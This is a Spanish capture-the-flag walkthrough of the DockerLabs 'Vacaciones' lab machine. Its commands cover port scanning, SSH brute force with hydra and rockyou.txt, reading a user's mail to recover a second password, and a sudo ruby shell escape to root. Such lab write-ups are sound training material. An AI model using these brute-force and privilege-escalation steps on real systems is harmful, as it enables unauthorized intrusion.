# 🎯 Vacaciones - DockerLabs

## 🔍 Fase 1: Enumeración

### Escaneo de puertos
`sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 172.17.0.2`
![[Nmap8.png]]

### Escaneo de versiones
`sudo nmap -sCV -p22,80 172.17.0.2`
![[Nmap8.2.png]]

---

## 🌐 Fase 2: Reconocimiento web

`curl http://172.17.0.2`
![[Curl8.png]]
**Resultado:**
`<!-- De : Juan Para: Camilo , te he dejado un correo es importante... -->`

**Usuarios identificados:** `camilo` y `juan`

---

## 🔑 Fase 3: Fuerza bruta SSH

`hydra -l camilo -P /home/moon/Documents/WorldList/rockyou.txt ssh://172.17.0.2 -t 4`
![[Hydra8.png]]
**Resultado:**
`[22][ssh] host: 172.17.0.2 login: camilo password: password1`

---

## 🚪 Fase 4: Acceso como camilo

`ssh camilo@172.17.0.2`
Contraseña: `password1`
![[Ssh8.png]]

---

## 📧 Fase 5: Encontrar credenciales de juan
`ls -la /var/mail/camilo`
![[Sudo8.png]]
`cat /var/mail/camilo/correo.txt`
![[Cat8.png]]
**Resultado:**
`Hola Camilo, ... aquí tienes la contraseña: 2k84dicb`

**Credenciales de juan:** `juan:2k84dicb`

---

## 🔄 Fase 6: Pivoting a juan

`su juan`
Contraseña: `2k84dicb`
![[Ssh8.2.png]]

---

## ⚡ Fase 7: Escalada a root

### Ver permisos sudo
`sudo -l`
![[Sudo8.2.png]]
**Resultado:**
`(ALL) NOPASSWD: /usr/bin/ruby`

### Ejecutar ruby como root
`sudo ruby -e 'exec "/bin/sh"'`
![[Sudo8.3.png]]
### Verificar
`whoami`
`root`

---
